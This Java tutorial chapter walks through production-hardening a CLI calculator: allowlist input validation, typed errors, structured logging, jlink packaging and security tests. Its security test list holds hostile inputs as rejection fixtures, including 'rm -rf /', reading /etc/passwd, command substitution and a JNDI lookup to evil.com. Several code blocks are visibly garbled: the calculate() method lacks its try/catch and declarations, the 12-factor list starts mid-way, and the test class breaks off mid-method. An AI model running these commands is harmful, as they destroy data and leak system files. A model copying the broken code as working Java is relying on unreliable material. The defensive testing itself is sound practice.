THE GAP BETWEEN “WORKING” AND “PRODUCTION-GRADE”:

PHASE 1 (JLG-028): Basic CLI calculator. Works on happy path.
  - int main → reads from stdin → evaluates expression → prints result
  - No error handling. No tests. No security.
  - "It works on my machine."

PHASE 2 (JLG-055): Functional + stream-based. Better code style.
  - Streams for parsing. Optional for null safety.
  - Unit tests for pure functions.
  - Still no production hardening.

PHASE 3 (JLG-071): JPMS modules + plugin architecture.
  - module-info.java for the calculator and operator modules.
  - ServiceLoader for operator plugins.
  - Integration tests.
  - Starting to look like real software.

PHASE 4 (this entry): Production-grade.
  - Security: input validation, no injection attack surface, audit log.
  - Observability: structured logging, JFR events, metrics.
  - Distribution: jlink image (30MB), optional GraalVM native image.
  - Testing: property-based tests, security tests, performance tests (JMH).
  - Error model: typed errors, exception hierarchy, recovery strategies.
  - Documentation: javadoc, module graph diagram.

After Phase 4: this calculator could run in a regulated financial environment.
The delta from Phase 3 to Phase 4: not new features. Just hardening.
Most "production-ready" gaps in real software: this same delta.

📘 Textbook Definition

Production-grade software: Software that meets the non-functional requirements of a production environment: security (resists known attack classes), observability (can be monitored, debugged, and diagnosed remotely), reliability (handles errors gracefully, degrades predictably), and distributability (can be packaged and deployed without external dependencies).

jlink (JEP 282, Java 9+): A tool to assemble and optimize a set of JDK modules into a custom, minimal Java runtime image. The resulting image contains only the modules needed to run the target application. Reduces image size from ~250MB (full JRE) to 30-80MB. Enables self-contained application distribution.

Structured logging: Logging where each entry is machine-readable (typically JSON). Fields: timestamp, severity, message, context fields (correlationId, userId, operation). Tools like Logback can output structured JSON. Enables log aggregation (ELK stack, Splunk, Datadog) and alerting on specific log fields.

Property-based testing: Testing with generated inputs (jqwik, QuickCheck for Java). Specify properties that should always hold: “for any valid expression string, the parser should either return a result or throw a documented exception, never null.” The framework generates thousands of inputs to find counterexamples.

⏱️ Understand It in 30 Seconds

One line: Phase 4: transform a working modular calculator into a production-deployable tool with security hardening, structured logging, jlink distribution, and full test coverage.

One analogy:

Phase 3 is a car that runs well on a test track. Phase 4 is the same car certified for public roads: airbags (input validation), seatbelts (error handling), speedometer and dashboard (observability), license plate (audit log), crash test certified (security tests), and emissions compliant (distribution). The engine and wheels: unchanged. The additional systems: ensure it can operate safely in the unpredictable real world.

One insight: The most valuable lesson from Phase 4: production hardening doesn’t change what the software DOES - it changes how it FAILS. A Phase 3 calculator fails with a stack trace. A Phase 4 calculator fails with a structured log entry, a typed error code, a recovery suggestion, and an audit trail. The end user sees: “Invalid input: division by zero. Try: calc 10 / 2.” The operator sees: an alert with context, the full expression, the user’s session, and whether this is a new failure pattern or a known one. The software’s observable failure mode: as important as its happy path.

🔩 First Principles Explanation

PRODUCTION HARDENING CATEGORIES:

// CATEGORY 1: Input validation and security
// The attack surface: anything the user types.
// Calculator input: arithmetic expressions.
// Potential injections:
// - Expression injection if using eval() (JavaScript) or reflection on class names
// - Path traversal if expression references files
// - Integer overflow if not bounded
// - Infinite computation if recursive expressions are allowed

// SAFE APPROACH: allowlist-based parser
// Only allow: digits, operators (+,-,*,/,^,%), parentheses, spaces.
// REJECT: letters (no variable injection), special chars, very long inputs.
public class InputValidator {
    // Allowlist: only characters that can appear in a valid expression.
    private static final Pattern VALID_EXPRESSION =
        Pattern.compile("^[0-9+\\-*/()\\s.^%]+$");
    private static final int MAX_INPUT_LENGTH = 256;

    public String validate(String input) {
        if (input == null || input.isBlank()) {
            throw new CalcException(ErrorCode.EMPTY_INPUT,
                "Expression is required");
        }
        if (input.length() > MAX_INPUT_LENGTH) {
            throw new CalcException(ErrorCode.INPUT_TOO_LONG,
                "Expression too long (max " + MAX_INPUT_LENGTH + " chars)");
        }
        if (!VALID_EXPRESSION.matcher(input).matches()) {
            throw new CalcException(ErrorCode.INVALID_CHARS,
                "Expression contains invalid characters. " +
                "Allowed: digits and operators +, -, *, /, (, ), %, ^");
        }
        return input.strip();
    }
}
// This prevents: reflection injection (no letters allowed),
// command injection (no semicolons, pipes, etc.),
// buffer overflow-style attacks (length limit).

// CATEGORY 2: Typed error model
public enum ErrorCode {
    EMPTY_INPUT,
    INPUT_TOO_LONG,
    INVALID_CHARS,
    PARSE_ERROR,
    DIVISION_BY_ZERO,
    OVERFLOW,
    PLUGIN_ERROR,
    INTERNAL_ERROR;
}
public class CalcException extends RuntimeException {
    private final ErrorCode code;
    private final String userMessage;  // user-facing (safe)
    // No stack trace details in user message (security: no info leakage).
    // Internal log: full exception with stack trace.
}

public BigDecimal calculate(String expression) {

    event.begin();

        BigDecimal result = engine.evaluate(expression);
        event.expression = expression;
        event.result = result.toPlainString();
        event.errorCode = null;
        return result;

        event.errorCode = e.getCode().name();
        throw e;
    } finally {
        event.end();
        event.durationMs = event.getDuration(TimeUnit.MILLISECONDS);
        if (event.shouldCommit()) event.commit();  // JFR threshold check
    }
}

Factor 7 - PORT BINDING: N/A (CLI, not a service).

Factor 8 - CONCURRENCY: scale out.
    If concurrent: thread-safe parser (no shared mutable state).

Factor 9 - DISPOSABILITY: fast startup, graceful shutdown.
    jlink: 500ms startup. Native image: 10ms startup.

    Structured JSON to stdout (Logback + LogstashEncoder).

Factor 12 - ADMIN PROCESSES: run as one-off tasks.
    JFR recording start/stop: jcmd commands.
    Plugin listing: calc --list-plugins command.
    Log level adjustment: system property at runtime. ✓

Code walkthrough: 12-factor principles applied to a CLI tool. The 12-factor methodology was written for web apps, but the principles apply to CLI tools. The most important for this calculator: config (Factor 3) and logs (Factor 11). Config: a calculator with hardcoded limits (MAX_INPUT_LENGTH = 256) cannot be adjusted without rebuilding. The operator can redirect stdout to any logging system. The calculator doesn’t know or care where logs go. This is the “don’t couple to specific logging infrastructure” principle. Factors 6 (stateless) and 8 (concurrency): relevant if the calculator ever becomes a service. Designing for statelessness now: makes the future migration trivial. This is why the 12-factor principles matter for CLI tools: they’re designing for evolution.

Example 1 - BAD vs GOOD: error handling at the boundary

// BAD: leaking internal information to users
public class UnsafeCalculator {
    public void run(String[] args) {
        try {
            double result = new ExpressionParser().parse(args[0]);
            System.out.println(result);
        } catch (Exception e) {
            // BAD: printing stack trace to stdout leaks:
            // - internal class names (com.example.calc.parser.RecursiveDescent)
            // - file paths (/home/buildserver/jenkins/workspace/calc/...)
            // - line numbers (attack surface for known vulnerabilities)
            // - library names and versions (facilitates targeted attacks)
            e.printStackTrace();
            // Also: System.exit(1) doesn't flush stdout/stderr.
        }
    }
}

// GOOD: type-safe error handling with user-safe messages
public class SafeCalculator {
    private static final Logger log =
        LoggerFactory.getLogger(SafeCalculator.class);

    public int run(String[] args) {
        if (args.length == 0) {
            System.err.println("Usage: calc <expression>");
            System.err.println("Example: calc \"2 + 3 * 4\"");
            return ExitCode.USAGE_ERROR;
        }
        String expression = args[0];
        try {
            String validated = new InputValidator().validate(expression);
            BigDecimal result = calculatorService.calculate(
                validated, UUID.randomUUID().toString());
            // Format: locale-aware or configurable precision
            System.out.println(result.stripTrailingZeros().toPlainString());
            return ExitCode.SUCCESS;
        } catch (CalcException e) {
            // User-safe: code and user message only.
            // No stack trace to user.
            System.err.println("Error: " + e.getUserMessage());
            // Diagnostic hint: actionable for the user.
            System.err.println("Type: calc --help for usage examples.");
            // Internal: full exception with stack trace for diagnosis.
            log.error("Calculation failed", e);
            return e.getCode().getExitCode();
        } catch (Exception e) {
            // Unexpected: something we didn't design for.
            System.err.println("Internal error. Please report this.");
            // Full stack trace: internal log only.
            log.error("Unexpected error for expression: {}", expression, e);
            return ExitCode.INTERNAL_ERROR;
        }
    }
}
// Exit codes: follows Unix convention. Enables shell scripting:
// calc "2+3" && echo "ok" || echo "failed"
// Exit 0: success. Exit 1: user error. Exit 2: internal error.

Code walkthrough: Error boundary pattern. The BAD version: e.printStackTrace() outputs the full stack trace to stdout/stderr. This leaks: class names (reveals internal package structure), file paths (reveals build infrastructure), line numbers (helps attackers correlate with known vulnerabilities in specific code patterns). The GOOD version: two distinct error channels. User-visible (stdout/stderr): only the ErrorCode name and user-safe message. Operational (structured log): full exception with stack trace. Not visible to users. CalcException.getUserMessage(): a message written for the end user. No technical details. The “internal error” catch: for exceptions we didn’t anticipate. It tells the user “report this” (captures the issue) while not revealing internals. Exit codes: Unix convention. return ExitCode.SUCCESS (0) vs ExitCode.USER_ERROR (1). Enables shell scripting: calc "2+3" && process-result || handle-error.

// Security tests: verify that known attack patterns are rejected.

@TestMethodOrder(MethodOrderer.DisplayName.class)
class SecurityTests {
    private final InputValidator validator = new InputValidator();
    private final CalculatorService calc =
        new CalculatorService(new DefaultEngine());

    // Test 1: expression injection via code execution patterns
    @ParameterizedTest
    @ValueSource(strings = {
        // Command injection attempts:
        "1; rm -rf /",
        "1 && cat /etc/passwd",
        "$(whoami)",
        "`id`",
        // Reflection injection attempts (no letters allowed):
        "Runtime.getRuntime().exec(\"touch /tmp/pwned\")",
        "Class.forName(\"java.lang.Runtime\")",
        // Path traversal:
        "../../../etc/passwd",
        // JNDI-like (from Log4Shell awareness):
        "${jndi:ldap://evil.com/x}",
        // Script injection:
        "<script>alert(1)</script>",
        // Null byte injection:
        "1\u0000+1",

        assertThatThrownBy(() -> validator.validate(input))
            .isInstanceOf(CalcException.class)
            .satisfies(e ->
                assertThat(((CalcException) e).getCode())
                    .isIn(ErrorCode.INVALID_CHARS, ErrorCode.INPUT_TOO_LONG));
    }

    // Test 2: valid expressions are always accepted
    @ParameterizedTest
    @ValueSource(strings = {
        "2+3", "100-50", "3*4", "10/2", "2^8",
        "(1+2)*3", "1.5+2.5", "-1+1", "100%3"
    })
    void validExpressionsAreAccepted(String input) {
        assertThatCode(() -> validator.validate(input))
            .doesNotThrowAnyException();
    }

    // Test 3: resource limits
    @Test
    void veryLongInputIsRejected() {
        String longInput = "1".repeat(10_000);
        assertThatThrownBy(() -> validator.validate(longInput))
            .isInstanceOf(CalcException.class)
            .satisfies(e ->
                assertThat(((CalcException) e).getCode())
                    .isEqualTo(ErrorCode.INPUT_TOO_LONG));
    }

    // Test 4: division by zero returns typed error (not unhandled exception)
    @Test
    void divisionByZeroReturnsTypedError() {
        assertThatThrownBy(() -> calc.calculate("1/0", "test"))
            .isInstanceOf(CalcException.class)
            .satisfies(e -> {
                CalcException ce = (CalcException) e;
                assertThat(ce.getCode()).isEqualTo(ErrorCode.DIVISION_BY_ZERO);
                // User message is not empty and is user-friendly:
                assertThat(ce.getUserMessage()).isNotBlank();
                // Does NOT contain internal class names:

Code walkthrough: Security test suite for the calculator. The test suite documents the security contract: “these inputs are ALWAYS rejected.” @ValueSource(strings = {...}) parameterized test: runs the same assertion for each input. The injection probes: cover known attack patterns from OWASP (command injection, path traversal, JNDI injection), even though the calculator can’t execute them directly. Allowlist-based validation: anything not in the allowlist is rejected. This means new attack patterns (unknown at test time) are ALSO rejected (by the allowlist). This is defense-in-depth: the validator doesn’t just block known attacks; it only allows known-safe input (much stronger). Test 4: the user message is clean. No "com.example", no "Exception", no "at " (stack trace). This test verifies the security property: internal details don’t leak to users.

💡 The Surprising Truth

// Surprising: GraalVM native-image fundamentally changes the performance profile.
// Not just "faster startup." The optimization MODEL is different.

// JVM: run-time profiling + JIT compilation.
// The JIT: profile → compile hotspot → optimize based on ACTUAL runtime behavior.
// Megamorphic call sites: JIT deoptimizes and tries polymorphic inline cache.
// The JIT can specialize for YOUR data distribution.

// GraalVM native-image: ahead-of-time compilation with profile-guided optimization.
// PGO (Profile-Guided Optimization): run with instrumentation → collect profile → compile with data.
// But: PGO profile = collected from training data.
// If production data differs from training: PGO benefits may not apply.
// Native image: more predictable performance (no JIT warmup), but less adaptive.

// For the calculator:
// JVM: first 1000 calculations slow (JIT warming up), then fast.
// Native image: consistently fast from the first call.
// For a CLI tool called once per invocation: native image wins (no warm-up chance).
// For a long-running server: JVM wins (JIT adapts to production traffic patterns).

// The deeper surprise: native-image's throughput can actually be LOWER than JVM
// for some workloads, because the JIT can speculate and then confirm at runtime,
// generating more aggressive optimizations than AOT can safely apply.
// "Faster startup, potentially lower peak throughput" is the honest trade-off.
// Not "native image is always better." Benchmark for YOUR workload.

🧠 Think About This Before We Continue

Q1. Why is it important that error messages shown to users NOT contain stack traces? Hint: Stack traces reveal: internal class names (helps attackers find known vulnerabilities in specific libraries), method names and line numbers (helps correlate with public exploit databases), file system paths (reveals build infrastructure, may reveal other sensitive paths), library names and versions (enables targeted dependency CVE attacks). Example: “at com.example.calc.parser.RecursiveDescent.evaluate(RecursiveDescent.java:47)” reveals: the parser class name, that it’s line 47, and the method. If RecursiveDescent has a known vulnerability (e.g., stack overflow at certain depths), the attacker knows what to probe. Security principle: principle of least information. Tell users what went wrong; don’t tell them HOW.

Q2. What is the difference between MDC.put() in SLF4J and passing context as parameters? Hint: MDC.put("sessionId", id) adds context to the thread-local Mapped Diagnostic Context. Every log statement in that thread: automatically includes sessionId without being passed explicitly. Benefits: no parameter threading (don’t add sessionId to every method signature). Context available in exception handlers (just log: MDC is still there). No forgetting to include context in some log statements. Drawbacks: thread-local = per-thread. Virtual threads (Java 21) and thread pool reuse: MDC can leak between requests if not cleared. ALWAYS MDC.clear() in a finally block. Alternative: structured parameter passing (no thread-local, but verbose).

Q3. Why might property-based testing NOT catch a bug that unit testing would catch? Hint: Property-based tests: verify properties that hold for ALL inputs. Unit tests: verify specific input-output pairs. If a bug only manifests for ONE specific value that the generator is unlikely to produce: property-based test may not find it. Example: a bug only triggered by input exactly “0.000001”. jqwik generates random values; the specific problematic value: low probability of generation. jqwik “shrinking”: when it finds a failure, it tries to find the SMALLEST input that fails. But: if the generator parameters exclude the problematic range, it won’t find it. ALSO: if the property itself is wrong (wrong invariant), both tests pass but the bug exists. Property-based tests: excellent for structural bugs (operations not commutative when they should be). Unit tests: excellent for specific scenario verification (this exact input produces this exact output).

Q1: “What does ‘production-grade’ mean for a small CLI tool? Is it overkill?”

Why they ask: Tests judgment about appropriate engineering investment.

Strong answer: “Production-grade” means: predictable failure, observable behavior, secure against known attack classes, and deployable without external dependencies. For a CLI tool: (1) Predictable failure: typed error codes with user-safe messages. Not stack traces. (2) Observable: structured logging with context. If the tool fails, I know what expression caused it. (3) Security: input validation. If the tool runs in a CI pipeline processing untrusted artifact metadata, injection protection matters. (4) Deployable: jlink image means no “install Java first” friction. Is it overkill? For a personal script: yes. For a shared tool in production infrastructure: no. The cost: 1 day of setup. The benefit: every incident is diagnosable, every CI failure is actionable. The techniques also serve as a template: the same InputValidator, CalcException, and jlink workflow used for a REST API or microservice. Learning on a small codebase: maximizes transfer.

Q2: “How would you test that the calculator’s error messages don’t leak internal information?”

Why they ask: Tests security testing methodology.

Strong answer: Three testing approaches: First: negative unit tests. For every CalcException, assert that getUserMessage() does NOT contain: "com.example" (class names), "Exception" (exception class names), "at " (stack trace markers), file path separators (\ or / in suspicious contexts). Second: fuzz the input. Send crafted inputs designed to trigger different code paths (division by zero, integer overflow, deep recursion, null, empty string). For each: verify the user message meets the policy. Third: static analysis. A custom SpotBugs or checkstyle rule that flags any e.toString() or e.getMessage() used in a user-visible output (System.out.println, HTTP response body). Any use of raw exception string in user output: a finding. In CI: the static analysis rule catches future regressions automatically. The unit tests: document the current contract. The fuzz tests: explore unknown edge cases. The static analysis: prevents regressions in new code.
